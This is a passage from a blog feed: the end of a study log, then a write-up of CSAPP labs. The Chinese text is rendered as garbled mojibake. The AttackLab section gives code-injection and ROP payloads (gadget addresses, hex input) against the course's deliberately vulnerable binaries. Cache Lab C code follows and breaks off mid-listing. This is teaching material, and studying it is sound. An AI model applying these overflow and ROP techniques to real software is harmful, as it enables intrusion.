</li><li>çœ‹äº†ä¸€ä½å¸¦ä½¬çš„åšå®¢åªèƒ½æ„Ÿå¹åˆå…¨åˆæ¸…æ™°, è‡ªå·±çš„kernel pwnåˆ†æ•£åœ¨å„ä¸ªpostå°±ç›¸å½¢è§ç»Œäº†. è¯¶ä¸æ•´ç†ä¹Ÿå‡‘åˆå§. </li></ul></li><li>4: ç»§ç»­GAME. æŸ¥äº†æŒºä¹…çš„ä¸œè¥¿, tagç±»å‡½æ•°è¿æ–‡æ¡£éƒ½æ²¡æœ‰â€¦.</li><li>5: çœ‹å®Œäº†GAME. å¯ä»¥æ•´æ•´å¸¸ç”¨include. kernelé¢˜ç›®è¿˜æ˜¯æœ‰å¾ˆå¤šå®ç°æˆ‘æ²¡æœ‰æ•´ç†è¿‡. å¯èƒ½è¿˜è¦å¼€å¥½å‡ ç¯‡æ–‡ç« . gefå’Œpwndbgæ„Ÿè§‰ä¹Ÿå‡çº§äº†ä¸€äº›åŠŸèƒ½, è¿˜æ²¡æ¥å¾—åŠçœ‹çœ‹. pwndbgç”¨é¡ºäº†. æ¢ä¸€ä¸ªæŒºéº»çƒ¦. æ›´æ–°æ„Ÿè§‰å¾ˆnice, æœç„¶è¦å®šæœŸç§ç§. </li></ul><h3 id="ç¬¬ä¸‰åäº”å‘¨-2-6-2-12"><a href="#ç¬¬ä¸‰åäº”å‘¨-2-6-2-12" class="headerlink" title="ç¬¬ä¸‰åäº”å‘¨: 2/6-2/12"></a>ç¬¬ä¸‰åäº”å‘¨: 2/6-2/12</h3><ul><li>6: æ•´ç†ä¸‹ç¬”è®°, ä¸»è¦æ˜¯kernel pwn. </li><li>7: ç»§ç»­æ•´ç†</li><li>8: ä»ç„¶æ˜¯. è¡¥å®Œäº†slab allocatoræ˜¯ä¸ªå•¥. CTF-wikiä¸Šå•¥ä¹Ÿæ²¡ææˆ‘ç°åœ¨æ‰çŸ¥é“è¿™ä¸œè¥¿. å¥½ä¹…éƒ½æ²¡äººæ›´æ–°äº†. å‘ç°å†…å­˜ç®¡ç†è¿˜æœ‰å¥½å¤šå¯çœ‹çš„. æœ‰æ—¶é—´ç§ç§. </li><li>9: çœ‹ä¹¦, linuxçš„ä¸€äº›æ“ä½œ. </li><li>10: æ²¡å¹²å•¥, çœ‹äº†ä¸¤é¡µ. </li><li>11: çœ‹åšå®¢, ç”µè„‘æ¸…ç°+32Gå†…å­˜ </li><li>12: çœ‹modern C++å’Œlinuxå†…å­˜ç®¡ç†.<br>-rc in linux version is <em>Kernel release candidates</em> </li></ul><h3 id="ç¬¬ä¸‰åå…­å‘¨-2-13-2-19"><a href="#ç¬¬ä¸‰åå…­å‘¨-2-13-2-19" class="headerlink" title="ç¬¬ä¸‰åå…­å‘¨: 2/13-2/19"></a>ç¬¬ä¸‰åå…­å‘¨: 2/13-2/19</h3><ul><li>13-15: çœ‹cppæ–°æ ‡å‡†. </li><li>16: çœ‹çœ‹è‚–ä½¬çš„idekCTF2022 <a href="https://kiprey.github.io/2023/01/idek_coroutine/">Coroutine</a>.</li><li>17-18: ç»§ç»­çœ‹</li><li>19: å¼€äº†ä¸¤ä¸ªCTF, js wasm risc-vå…¨éƒ½ä¸ç†Ÿ, åˆæ˜¯å›´è§‚çš„ä¸€å¤©. </li></ul><h3 id="ç¬¬ä¸‰åä¸ƒå‘¨-2-20-2-26"><a href="#ç¬¬ä¸‰åä¸ƒå‘¨-2-20-2-26" class="headerlink" title="ç¬¬ä¸‰åä¸ƒå‘¨: 2/20-2/26"></a>ç¬¬ä¸‰åä¸ƒå‘¨: 2/20-2/26</h3><ul><li>20: </li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>schedule</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP_Lab</title>
    <link href="/2021-05/Archive-CSAPP-Lab/"/>
    <url>/2021-05/Archive-CSAPP-Lab/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-LAB"><a href="#CSAPP-LAB" class="headerlink" title="CSAPP_LAB"></a>CSAPP_LAB</h1><h2 id="AttackLab"><a href="#AttackLab" class="headerlink" title="AttackLab"></a>AttackLab</h2><blockquote><p>è¦ä¼šä½¿ç”¨hex2rawå’Œctargetå’Œrtarget, ç”¨ç®¡é“ç¬¦å·æ¯”è¾ƒæ–¹ä¾¿. </p></blockquote><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h3><p>ç›´æ¥ä½¿ç”¨æº¢å‡ºçš„8å­—èŠ‚æ”¹å†™ä¸ºtouch1çš„åœ°å€</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">touch2</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> val)</span></span>&#123;<br>    vlevel = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (val == cookie)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        fail(<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0:48 c7 c7 fa 97 b9 59  mov    $0x59b997fa,%rdi<br>9:68 ec 17 40 00       pushq  $0x4017ec<br>e:c3                   retq   <br></code></pre></div></td></tr></table></figure><p>æ­¤é˜¶æ®µéœ€è¦æ‰§è¡Œæ ˆä¸Šçš„ä»£ç , åœ¨ç¼“å†²åŒºé‡Œå¡«å……æ‰€å†™çš„ä»£ç å, ç”¨gdbè·å¾—bufçš„æ ˆé¡¶, è¦†ç›–getbufçš„è¿”å›åœ°å€å³å¯</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h3><p>touch3å‡½æ•°é‡Œè°ƒç”¨äº†hexmatch(cookie, sval), svalæ˜¯char*ç±»å‹ä¸”ä¸ºtouch3çš„ç¬¬ä¸€ä¸ªå˜é‡, ä½œç”¨æ˜¯æ¯”è¾ƒå­—ç¬¦ä¸²svalå’Œcookieæ˜¯å¦ç›¸åŒ, æ‰€ä»¥åœ¨è°ƒç”¨touch3ä¹‹å‰éœ€è¦å°†%rdiè®¾ç½®ä¸ºcookieçš„å­—ç¬¦ä¸²å½¢å¼, å³ASCIIç å€¼, ç¨‹åºçš„å¤§è‡´è¿è¡Œè¿‡ç¨‹å¦‚ä¸‹:</p><ol><li><p>test=&gt;getbuf, 40å­—èŠ‚çš„æ ˆç©ºé—´å­˜æ”¾æ”»å‡»ä»£ç , å†…å®¹ä¸º: è®¾ç½®%rdi, å°†touch3åœ°å€æ¨åˆ°æ ˆä¸Š, ret. æº¢å‡ºçš„8å­—èŠ‚ä¸ºgetbufè¿”å›åœ°å€, æ”¹å†™ä¸ºæ”»å‡»ä»£ç çš„é¦–åœ°å€.</p><img src="../../image/CSAPP_Lab/afaadcb0e4f822d9c3f9a27ca83b01bf.png" alt="img" style="zoom:67%;" /></li><li><p>é¦–åœ°å€è·å–æ–¹æ³•: ç”¨gdbè°ƒè¯•è®¾ç½®æ–­ç‚¹åˆ°getbuf, æ‰¾åˆ°%rspå‡å»40åçš„å€¼, å³ä¸ºæ”»å‡»ä»£ç åœ°å€</p></li><li><p>è®¾ç½®%rdiè¿˜è¦æ³¨æ„hexmatchçš„éšæœºå‡½æ•°, æ‰€ä»¥å°†è¾“å…¥çš„å­—ç¬¦ä¸²å­˜åˆ°getbufè¿”å›åœ°å€çš„ä¸Šæ–¹testä»£ç æ®µé‡Œ, ä¸æ”»å‡»ä»£ç è·ç¦»40+8(è¿”å›åœ°å€)å­—èŠ‚, å°†è¯¥åœ°å€movåˆ°%rdié‡Œ. ç”±äºä¸€æ¬¡æ€§ä½¿ç”¨ç¨‹åº, ä¸ç”¨å…³å¿ƒtesté‡Œçš„æ•°æ®è¢«æ”¹å˜</p></li></ol><h3 id="ROP-phase-4"><a href="#ROP-phase-4" class="headerlink" title="ROP: phase 4"></a>ROP: phase 4</h3><p>è¿™ä¸€èŠ‚å®é™…ä¸Šé‡å¤äº†phase2çš„ä»»åŠ¡, ä½†æ˜¯ä½¿ç”¨äº†æ ˆéšæœºåŒ–å’Œé™åˆ¶ä»£ç å¯æ‰§è¡ŒåŒºåŸŸ, æ‰€ä»¥é‡‡ç”¨ROPè¿›è¡Œæ”»å‡».</p><p>ä½¿ç”¨objdump -s rtarget &gt; rtarget.så¾—åˆ°åæ±‡ç¼–ä»£ç , å¯ä»¥ä»handoutä¸­å¾—çŸ¥æ‰€éœ€çš„gadgetåœ¨ä»¥start_farmå‡½æ•°å¼€å§‹, ä»¥mid_farmç»“æŸçš„ä¸€äº›å‡½æ•°ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0000000000401994 &lt;start_farm&gt;:<br>  401994:b8 01 00 00 00       mov    $0x1,%eax<br>  401999:c3                   retq  <br></code></pre></div></td></tr></table></figure><p>ç”±äºæ‰¾ä¸åˆ°ç›´æ¥pop %rdiçš„ä»£ç , æ‰€ä»¥è½¬å‘popåˆ°å…¶ä»–å¯„å­˜å™¨ç„¶åmovåˆ°%rdiä¸­, è¿™æ—¶å€™å¯ä»¥å‘ç°addval_219å’Œaddval_273ä¸­çš„58 90 c3, 48 89 c7 c3, å³pop %rax, mov %rax, %rdi(çœŸtmå°±æ˜¯ç›´æ¥æ‰¾å•Š).</p><p>ç„¶ååœ¨bufé‡Œå¡«å……40å­—èŠ‚ç©ºå­—ç¬¦, æº¢å‡ºçš„8å­—èŠ‚å®šä½åˆ°219, ä»æ ˆä¸Špopå‡ºcookie, ret(0xc3)æŒ‡ä»¤ä»æ ˆä¸Šå¼¹å‡ºä¸€ä¸ªåœ°å€å³273çš„åœ°å€, æ‰§è¡Œå®Œmovåå†ret, æœ€ç»ˆè·³è½¬åˆ°touch2.</p><img src="../../image/CSAPP_Lab/0.png" style="zoom:60%;" /><p>exploit code:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00 ==&gt;40å­—èŠ‚<br>ab 19 40 00 00 00 00 00<br>fa 97 b9 59 00 00 00 00<br>a2 19 40 00 00 00 00 00<br>ec 17 40 00 00 00 00 00<br></code></pre></div></td></tr></table></figure><p>ç»“æŸ.</p><h3 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h3><blockquote><p>Official Warning : If you have other pressing obligations consider stopping right now.</p><p>é‡å¤äº†phase3çš„ä»»åŠ¡.Figure 3Då°±å’Œnopä¸€æ ·, ä¸æ”¹å˜ä»»ä½•ä¸œè¥¿, å¯ä»¥æ— è§†.</p></blockquote><p>ç”±äºä½¿ç”¨äº†æ ˆéšæœºåŒ–, åˆéœ€è¦æŠŠcookieçš„åœ°å€æ”¾åˆ°æ ˆä¸Šäº§ç”Ÿåœ°å€, å†å­˜åˆ°%rdiä¸­, æ‰€ä»¥éœ€è¦ä½¿ç”¨ä¸€äº›ä»£ç ç»„åˆæ¥äº§ç”Ÿä¸€ä¸ªå›ºå®šåç§»é‡çš„æ ˆåœ°å€.<strong>æœ‰ä¸¤ç§æ–¹æ³•:</strong> </p><ol><li><p>ä½¿ç”¨handouté‡Œé¢ç»™å‡ºçš„é‚£äº›ç¼–ç , ä»£ç è¾ƒé•¿æ‰€ä»¥æ‰è¯´è´¹æ—¶é—´</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">;in addval_190<br>movq %rsp,%rax<br>ret<br>;in addval_426<br>movq %rax,%rdi<br>ret<br>;in addval_219<br>popq %rax<br>ret<br>;in getval_481<br>movl %eax,%edx<br>ret<br>;in getval_159<br>movl %edx,%ecx<br>ret<br>;in addval_436<br>movl %ecx,%rsi<br>ret<br>;in add_xy<br>lea (%rdi,%rsi,1),%rax<br>retq <br>;in addval_426<br>movq %rax,%rdi<br>ret<br></code></pre></div></td></tr></table></figure><p>%rsp+80å¤„æ”¾å­—ç¬¦ä¸²ï¼Œ%rsp+8å¤„æ‰å¼€å§‹æ‰§è¡Œaddval_190. æ‰€ä»¥ <strong>(%rsp+80)-(%rsp+8)=72=0x48</strong></p></li><li><p>ä½¿ç”¨addæŒ‡ä»¤çš„ç¼–ç , ä½¿å¾—å®é™…åªéœ€ä¸‰è¡Œæ±‡ç¼–</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0000000000401a03 &lt;addval_190&gt;:<br>  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax<br>  401a09: c3                    retq<br>00000000004019d6 &lt;add_xy&gt;:<br>  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax<br>  4019da: c3                    retq<br>00000000004019a0 &lt;addval_273&gt;:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3                    retq<br></code></pre></div></td></tr></table></figure><p>æå–å:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">401a06: 48 89 e0              movq %rsp, %rax<br>401a09: c3                    retq<br><br>4019d8: 04 37                 add 0x37, %al<br>4019da: c3                    retq<br><br>4019a2: 48 89 c7              movq %rax, %rdi<br>4019a5: c3                    retq<br></code></pre></div></td></tr></table></figure><p>ç»“æŸ.</p></li></ol><h2 id="Cache-Lab"><a href="#Cache-Lab" class="headerlink" title="Cache Lab"></a>Cache Lab</h2><h3 id="1-Part-A"><a href="#1-Part-A" class="headerlink" title="1)Part A"></a>1)Part A</h3><p>å°±ï¼Œæ²¡ä»€ä¹ˆå¯è¯´çš„ï¼Œç™½å«–çœŸé¦™ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">mem_addr_t</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line_t</span>&#123;</span><br>    <span class="hljs-keyword">mem_addr_t</span> tag;<br>    <span class="hljs-keyword">int</span> valid;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> lru; <br>&#125;;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line_t</span>* <span class="hljs-title">cache_set_t</span>;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">cache_set_t</span>* <span class="hljs-keyword">cache_t</span>;<br><br><span class="hljs-keyword">cache_t</span> cache;<br><span class="hljs-keyword">mem_addr_t</span> set_index_mask = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">accessData</span><span class="hljs-params">(<span class="hljs-keyword">mem_addr_t</span> addr)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> eviction_line;<br>  <span class="hljs-comment">// æ³¨æ„æ˜¯æ— ç¬¦å·æ•´æ•°</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> eviction_lru = <span class="hljs-number">-1</span>;<br>  eviction_line = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">mem_addr_t</span> tag = addr &gt;&gt; (s + b);<br>  <span class="hljs-keyword">cache_set_t</span> cache_set = cache[(addr &gt;&gt; b) &amp; set_index_mask];<br><br>  <span class="hljs-comment">// æ‰€éœ€æ•°æ®çš„cache_lineç¼–å·</span><br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    <span class="hljs-comment">// å¦‚æœæŠŠæ‰€æœ‰çš„cache_lineå…¨éå†å®Œäº†è¿˜æ‰¾ä¸åˆ°æ‰€éœ€çš„æ•°æ®</span><br>    <span class="hljs-keyword">if</span> ( i &gt;= E )<br>    &#123;<br>      <span class="hljs-comment">// æ•°æ®æœªå‘½ä¸­</span><br>      ++miss_count;<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;miss &quot;</span>);<br>      <span class="hljs-comment">// åœ¨ä¸€ç»„cache_lineä¸­æŸ¥æ‰¾å°†è¢«åˆ é™¤çš„cache_line</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> ia = <span class="hljs-number">0</span>; ia &lt; E; ++ia )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( cache_set[ia].lru &lt; eviction_lru )<br>        &#123;<br>          eviction_line = ia;<br>          eviction_lru = cache_set[ia].lru;<br>        &#125;<br>     &#125;<br>      <span class="hljs-comment">// å¦‚æœå½“å‰è¿™ä¸ªè¦è¢«åˆ é™¤çš„cache_lineæ˜¯valid</span><br>      <span class="hljs-comment">// å³ï¼Œè¿™ä¸ªè¦è¢«æ›¿æ¢æ•°æ®çš„cache_lineæ˜¯ä¸€æ¡ä¹‹å‰è¯»å…¥çš„æ•°æ®è€Œä¸æ˜¯ç©ºè¡Œ</span><br>      <span class="hljs-keyword">if</span> ( cache_set[eviction_line].valid )<br>      &#123;<br>        <span class="hljs-comment">// åˆ é™¤æ•°+1</span><br>        ++eviction_count;<br>        <span class="hljs-keyword">if</span> ( verbosity )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;eviction &quot;</span>);<br>      &#125;<br>      <span class="hljs-comment">// æ¨¡æ‹Ÿä»**ä¸»å­˜**è¯»å…¥å¹¶è¦†ç›–æ•°æ®åˆ°è¿™ä¸ªåˆšåˆšè¢«åˆ é™¤ï¼ˆæˆ–æœ¬æ¥æ˜¯ç©ºè¡Œï¼‰çš„cache_lineé‡Œ</span><br>      cache_set[eviction_line].valid = <span class="hljs-number">1</span>;<br>      cache_set[eviction_line].tag = tag;<br>      cache_set[eviction_line].lru = lru_counter++;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// æŸ¥æ‰¾cacheä¸­çš„æ•°æ®</span><br>    <span class="hljs-keyword">if</span> ( cache_set[i].tag == tag &amp;&amp; cache_set[i].valid )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-comment">// å¦‚æœæ‰¾åˆ°æ•°æ®äº†ï¼Œè‡ªç„¶å°±hit_count++</span><br>  ++hit_count;<br>  <span class="hljs-keyword">if</span> ( verbosity )<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hit &quot;</span>);<br>  cache_set[i].lru = lru_counter++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">replayTrace</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *trace_fn)</span></span><br><span class="hljs-function"></span>&#123;<br>  FILE * trace_fp = fopen(trace_fn, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !trace_fp )<br>  &#123;<br>    <span class="hljs-keyword">int</span>* err_num = __errno_location();<br>    <span class="hljs-keyword">char</span>* err_str = strerror(*err_num);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s: %s\n&quot;</span>, trace_fn, err_str);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1000</span>];<br>  <span class="hljs-keyword">while</span> ( fgets(buf, <span class="hljs-number">1000</span>, trace_fp) )<br>  &#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">mem_addr_t</span> addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;S&#x27;</span> || buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;L&#x27;</span> || buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;M&#x27;</span> )<br>    &#123;<br>      <span class="hljs-built_in">sscanf</span>(&amp;buf[<span class="hljs-number">3</span>], <span class="hljs-string">&quot;%llx,%u&quot;</span>, &amp;addr, &amp;len);<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %llx,%u &quot;</span>, buf[<span class="hljs-number">1</span>], addr, len);<br>      <span class="hljs-comment">// è¯»å–/å†™å…¥æ•°æ®</span><br>      <span class="hljs-comment">// å†™å…¥æ•°æ®åŒæ ·éœ€è¦åˆ¤æ–­æ•°æ®æ˜¯å¦å­˜åœ¨ä¸cacheã€‚å¦‚æœæ•°æ®ä¸åœ¨ï¼ŒåŒæ ·è¦å°†å…¶è¯»å›cache</span><br>      accessData(addr);<br>      <span class="hljs-comment">// å¦‚æœå½“å‰æŒ‡ä»¤æ˜¯ä¿®æ”¹æŒ‡ä»¤ï¼Œåˆ™ä¸Šä¸€æ¡accessDataè¯»å–æ•°æ®ï¼Œä¸‹ä¸€æ¡çš„accessDataå†™å…¥æ•°æ®</span><br>      <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;M&#x27;</span> )<br>        accessData(addr);<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    &#125;<br>  &#125;<br>  fclose(trace_fp);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-Part-B"><a href="#2-Part-B" class="headerlink" title="2)Part B"></a>2)Part B</h3><h4 id="32-32"><a href="#32-32" class="headerlink" title="32*32:"></a>32*32:</h4><p>æœ€ä¼˜è§£æ³•æ˜¯éå¸¸æš´åŠ›éå¸¸è¯¦ç»†çš„å†™å‡ºæ¯ä¸€è¡Œçš„ç§»åŠ¨æƒ…å†µï¼Œæ™®é€šè§£æ³•æ˜¯è§„è§„çŸ©çŸ©çš„8åˆ†å—ã€‚<a href="https://zhuanlan.zhihu.com/p/79058089">é“¾æ¥</a>_</p><h4 id="64-64"><a href="#64-64" class="headerlink" title="64*64:"></a>64*64:</h4><p>ç¬¬ä¸€ç§è§£æ³•æ˜¯å…«åˆ†å—ç„¶åå†4åˆ†å—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (M == <span class="hljs-number">64</span>)<br>&#123;<br><span class="hljs-keyword">int</span> i, j, x, y;<br><span class="hljs-keyword">int</span> x1, x2, x3, x4, x5, x6, x7, x8;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">8</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (x = i; x &lt; i + <span class="hljs-number">4</span>; ++x)<br>&#123;<br>x1 = A[x][j]; x2 = A[x][j+<span class="hljs-number">1</span>]; x3 = A[x][j+<span class="hljs-number">2</span>]; x4 = A[x][j+<span class="hljs-number">3</span>];<br>x5 = A[x][j+<span class="hljs-number">4</span>]; x6 = A[x][j+<span class="hljs-number">5</span>]; x7 = A[x][j+<span class="hljs-number">6</span>]; x8 = A[x][j+<span class="hljs-number">7</span>];<br><br>B[j][x] = x1; B[j+<span class="hljs-number">1</span>][x] = x2; B[j+<span class="hljs-number">2</span>][x] = x3; B[j+<span class="hljs-number">3</span>][x] = x4;<br>B[j][x+<span class="hljs-number">4</span>] = x5; B[j+<span class="hljs-number">1</span>][x+<span class="hljs-number">4</span>] = x6; B[j+<span class="hljs-number">2</span>][x+<span class="hljs-number">4</span>] = x7; B[j+<span class="hljs-number">3</span>][x+<span class="hljs-number">4</span>] = x8;<br>&#125;<br><span class="hljs-keyword">for</span> (y = j; y &lt; j + <span class="hljs-number">4</span>; ++y)<br>&#123;<br>x1 = A[i+<span 